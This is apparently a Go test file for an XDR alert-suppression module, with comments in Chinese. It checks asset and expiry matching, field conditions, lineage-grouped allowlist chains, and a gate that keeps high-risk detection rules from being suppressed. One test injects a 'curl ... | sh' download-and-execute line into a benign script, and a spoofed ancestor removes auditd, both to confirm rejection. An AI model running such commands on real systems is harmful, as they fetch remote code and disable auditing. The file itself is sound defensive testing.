package suppress

import (
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"openxdr/server/internal/sigma"
)

var (
	fixNow   = time.Date(2026, 8, 9, 12, 0, 0, 0, time.UTC)
	fixAsset = uuid.MustParse("11111111-1111-1111-1111-111111111111")
	otherAS  = uuid.MustParse("22222222-2222-2222-2222-222222222222")
)

func ptr[T any](v T) *T { return &v }

func TestMatchRule(t *testing.T) {
	expired := time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC) // 早于 fixNow
	valid := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)   // 晚于 fixNow
	idA := uuid.New()
	idB := uuid.New()
	idC := uuid.New()

	cases := []struct {
		name    string
		entries []entry
		assetID *uuid.UUID
		want    *uuid.UUID
	}{
		{name: "无规则返回 nil", entries: nil, want: nil},
		{name: "空切片返回 nil", entries: []entry{}, want: nil},
		{
			name:    "全局规则任意资产命中",
			entries: []entry{{id: idA, expires: &valid}},
			assetID: ptr(fixAsset),
			want:    ptr(idA),
		},
		{
			name:    "全局规则空资产命中",
			entries: []entry{{id: idA, expires: &valid}},
			assetID: nil,
			want:    ptr(idA),
		},
		{
			name:    "限定资产匹配命中",
			entries: []entry{{id: idA, assetID: ptr(fixAsset), expires: &valid}},
			assetID: ptr(fixAsset),
			want:    ptr(idA),
		},
		{
			name:    "限定资产不匹配跳过",
			entries: []entry{{id: idA, assetID: ptr(fixAsset), expires: &valid}},
			assetID: ptr(otherAS),
			want:    nil,
		},
		{
			name:    "限定资产遇空资产跳过",
			entries: []entry{{id: idA, assetID: ptr(fixAsset), expires: &valid}},
			assetID: nil,
			want:    nil,
		},
		{
			name:    "过期规则跳过",
			entries: []entry{{id: idA, expires: &expired}},
			assetID: nil,
			want:    nil,
		},
		{
			name: "第一条过期第二条命中取第二条",
			entries: []entry{
				{id: idA, expires: &expired},
				{id: idC, assetID: ptr(fixAsset), expires: &valid},
			},
			assetID: ptr(fixAsset),
			want:    ptr(idC),
		},
		{
			name: "既过期又不匹配全部跳过",
			entries: []entry{
				{id: idA, assetID: ptr(otherAS), expires: &valid},
				{id: idB, expires: &expired},
			},
			assetID: ptr(fixAsset),
			want:    nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := matchRule(tc.entries, "r", nil, true, tc.assetID, nil, nil, fixNow)
			if !sameID(got, tc.want) {
				t.Fatalf("matchRule() = %v, want %v", got, tc.want)
			}
		})
	}
}

func sameID(a, b *uuid.UUID) bool {
	if a == nil || b == nil {
		return a == nil && b == nil
	}
	return *a == *b
}

// TestSuppressedHit 验证命中时返回 true 并累加计数，不命中不计数。
func TestSuppressedHit(t *testing.T) {
	id := uuid.New()
	now := fixNow

	s := &Store{
		byRule: map[string][]entry{
			"r1": {{id: id, expires: ptr(now.Add(time.Hour))}},
			"r2": {{id: uuid.New(), assetID: ptr(otherAS), expires: ptr(now.Add(time.Hour))}},
		},
		counters: map[uuid.UUID]*counter{},
	}

	if !s.Suppressed("r1", ptr(fixAsset), nil, now) {
		t.Fatal("r1 应命中")
	}
	if !s.Suppressed("r1", nil, nil, now.Add(time.Second)) {
		t.Fatal("r1 第二次应命中")
	}
	if s.Suppressed("r2", ptr(fixAsset), nil, now) {
		t.Fatal("r2 限定资产不匹配应不命中")
	}
	if s.Suppressed("不存在", ptr(fixAsset), nil, now) {
		t.Fatal("无规则应不命中")
	}

	s.mu.RLock()
	c := s.counters[id]
	s.mu.RUnlock()
	if c == nil {
		t.Fatal("命中应记录计数器")
	}
	if c.hits != 2 {
		t.Fatalf("hits = %d, want 2", c.hits)
	}
	if !c.last.Equal(now.Add(time.Second)) {
		t.Fatalf("last = %v, want %v", c.last, now.Add(time.Second))
	}
}

// 字段条件：只压掉字段对得上的命中，同规则别的命中照常告警；条件校验拒绝乱写的字段与操作符
func TestConditions(t *testing.T) {
	asset := ptr(fixAsset)
	e := []entry{{id: uuid.New(), assetID: asset, compiled: compileConditions([]Condition{{Field: "query.hostname", Op: "endswith", Value: ".DOGGYGO.top"}})}}
	hit := map[string]any{"query": map[string]any{"hostname": "4mrf9fwf.doggygo.top"}}
	other := map[string]any{"query": map[string]any{"hostname": "evil.top"}}
	if matchRule(e, "r", nil, true, asset, hit, nil, fixNow) == nil {
		t.Error("域名对得上应抑制（不区分大小写）")
	}
	if matchRule(e, "r", nil, true, asset, other, nil, fixNow) != nil || matchRule(e, "r", nil, true, asset, nil, nil, fixNow) != nil {
		t.Error("别的域名或缺字段不应抑制")
	}
	port := []entry{{id: uuid.New(), compiled: compileConditions([]Condition{{Field: "dst_endpoint.port", Op: "equals", Value: "22"}, {Field: "process.cmd_line", Op: "contains", Value: "__termix"}})}}
	if matchRule(port, "r", nil, true, nil, map[string]any{"dst_endpoint": map[string]any{"port": 22.0}, "process": map[string]any{"cmd_line": "bash -c __TERMIX_EXIT"}}, nil, fixNow) == nil {
		t.Error("数字字段与多条件 AND 应生效")
	}
	for _, bad := range [][]Condition{
		{{Field: "Query.Hostname", Op: "equals", Value: "x"}},
		{{Field: "query.hostname", Op: "regex", Value: "x"}},
		{{Field: "ancestor.file.path", Op: "equals", Value: "/bin/sh"}},
		{{Field: "query.hostname", Op: "equals", Value: ""}},
		{{Field: "a", Op: "equals", Value: "1"}, {Field: "b", Op: "equals", Value: "1"}, {Field: "c", Op: "equals", Value: "1"}, {Field: "d", Op: "equals", Value: "1"}},
	} {
		if Validate(bad) == nil {
			t.Errorf("应拒绝: %+v", bad)
		}
	}
}

// TestBuiltinGroupedAncestorAndSafetyGate 验证同组 ancestor.* 必须命中同一祖先（不能跨祖先串台），且高危类别一律不放行
func TestBuiltinGroupedAncestorAndSafetyGate(t *testing.T) {
	conds := []Condition{
		{Field: "process.file.path", Op: "equals", Value: "/usr/bin/base64"},
		{Field: "ancestor.file.path", Op: "equals", Value: "/usr/bin/apt-get", Group: 1},
		{Field: "ancestor.cmd_line", Op: "regex", Value: `\bupdate\b`, Group: 1},
	}
	if err := ValidateBuiltin(conds); err != nil {
		t.Fatalf("合法内置条件应通过: %v", err)
	}
	// 缺少父/祖先可执行路径的弱条件必须被拒绝
	if err := ValidateBuiltin([]Condition{
		{Field: "process.file.path", Op: "equals", Value: "/bin/uname"},
		{Field: "process.cmd_line", Op: "equals", Value: "uname -a"},
	}); err == nil {
		t.Fatal("缺少血缘可执行路径的内置链应被拒绝")
	}

	raw := map[string]any{"process": map[string]any{"file": map[string]any{"path": "/usr/bin/base64"}}}
	// 祖先 A 有 apt-get 但不是 update，祖先 B 有 update 但不是 apt-get —— 不能跨祖先串台匹配
	crossSpoof := []map[string]any{
		{"file": map[string]any{"path": "/usr/bin/apt-get"}, "cmd_line": "apt-get remove auditd"},
		{"file": map[string]any{"path": "/bin/sh"}, "cmd_line": "echo update"},
	}
	if MatchesWithLineage(conds, raw, crossSpoof) {
		t.Fatal("跨祖先拼凑同一 group 条件不应匹配")
	}
	sameAnc := []map[string]any{
		{"file": map[string]any{"path": "/usr/bin/apt-get"}, "cmd_line": "apt-get -y update"},
	}
	if !MatchesWithLineage(conds, raw, sameAnc) {
		t.Fatal("同一祖先同时满足 group 条件应匹配")
	}

	// 验证仓库自带内置良性链全部可加载，且高危规则 / 情报命中被硬闸门拦截
	engine, _ := sigma.LoadDirReport("../../../rules")
	chains, err := LoadBuiltinDir("../../../rules/benign-chains", engine)
	if err != nil || len(chains) < 6 {
		t.Fatalf("加载内置良性链失败: len=%d err=%v", len(chains), err)
	}
	for _, blocked := range []string{
		"intel:ip:1.2.3.4",
		"decoy:ssh:root",
		sigma.RuleBruteforceSuccess,
		sigma.RuleLateralSpray,
		sigma.RuleNewSSHKey,
		"b03fc985-9d70-4dd1-a4a1-0bcaf4019a74", // T1611 特权容器逃逸（medium）
		"3b90a5b9-6634-4060-ae16-bb43e6b39dc8", // T1552 凭据访问（medium）
		"80915f59-9b56-4616-9de0-fd0dea6c12fe", // T1685.006 清日志（medium）
		"e3a8a052-111f-4606-9aee-f28ebeb76776", // T1686 关安全工具（medium）
		"f072e3f7-1b19-4fa7-9c91-6708f78280f6", // T1485 磁盘销毁（medium）
		"6c4e2f43-d94d-4ead-b64d-97e53fa2bd05", // T1053.003 cron 持久化（low）
		"179b3686-6271-4d87-807d-179b3686807d", // 不存在/未知规则
	} {
		if BuiltinAllowedRule(blocked, engine, false) || BuiltinAllowedRule(blocked, engine, true) {
			t.Errorf("高危或未知规则 %q 绝不允许被内置良性链放行", blocked)
		}
	}
	if !BuiltinAllowedRule(sigma.RuleNewProcess, engine, false) {
		t.Error("xdr:new-process 应允许被内置良性链放行")
	}
	if !BuiltinAllowedRule("d2f3f4a1-9c30-4d3e-b1e7-3f6a1c2b4d5e", engine, false) {
		t.Error("低/中危侦察规则应允许被内置良性链放行")
	}
}

// Scutum 测试 PG 容器链：生产原文放行；脚本被改一个字、换了容器名或父进程都不放行。
// 触发规则只有战术标签没有技术，detectcheck 语料测不到，在这里直接验
func TestBuiltinScutumTestPGChain(t *testing.T) {
	engine, _ := sigma.LoadDirReport("../../../rules")
	chains, err := LoadBuiltinDir("../../../rules/benign-chains", engine)
	if err != nil {
		t.Fatal(err)
	}
	var conds []Condition
	for _, c := range chains {
		if c.ID == "scutum-test-pg-init" {
			conds = c.Conditions
		}
	}
	if conds == nil {
		t.Fatal("缺 scutum-test-pg-init")
	}
	if !BuiltinAllowedRule("30bcce26-51c5-49f2-99c8-7b59e3af36c7", engine, false) {
		t.Fatal("可疑目录执行脚本（中危执行类）应允许被内置链放行")
	}
	script := "bash -c export PATH=/usr/lib/postgresql/17/bin:$PATH PGDATA=/tmp/pgdata\necho test >/tmp/pw\ninitdb -U scutum -A scram-sha-256 --pwfile=/tmp/pw >/dev/null\necho 'host all all all scram-sha-256' >>$PGDATA/pg_hba.conf\nwhile :; do\n  while [ -f /tmp/hold ]; do sleep 0.2; done\n  postgres -c listen_addresses=* -c fsync=off\ndone"
	event := func(container, cmd, parent string) map[string]any {
		return map[string]any{
			"container": map[string]any{"name": container, "runtime": "docker"},
			"process": map[string]any{"file": map[string]any{"path": "/bin/bash"}, "cmd_line": cmd,
				"parent_process": map[string]any{"file": map[string]any{"path": parent}, "cmd_line": "runc init"}},
		}
	}
	cases := map[string]struct {
		raw  map[string]any
		want bool
	}{
		"生产原文":       {event("scutum-test-pg-4037943", script, "/runc"), true},
		"其他主版本":      {event("scutum-test-pg-1", strings.Replace(script, "/17/", "/16/", 1), "/runc"), true},
		"追加下载执行":     {event("scutum-test-pg-1", strings.Replace(script, "\nwhile :", "\ncurl -s http://203.0.113.9/x | sh\nwhile :", 1), "/runc"), false},
		"别的容器名":      {event("evil-pg-1", script, "/runc"), false},
		"父进程不是 runc": {event("scutum-test-pg-1", script, "/usr/sbin/sshd"), false},
	}
	for name, c := range cases {
		if got := MatchesWithLineage(conds, c.raw, DefaultLineage(c.raw)); got != c.want {
			t.Errorf("%s: 放行=%v，应为 %v", name, got, c.want)
		}
	}
}
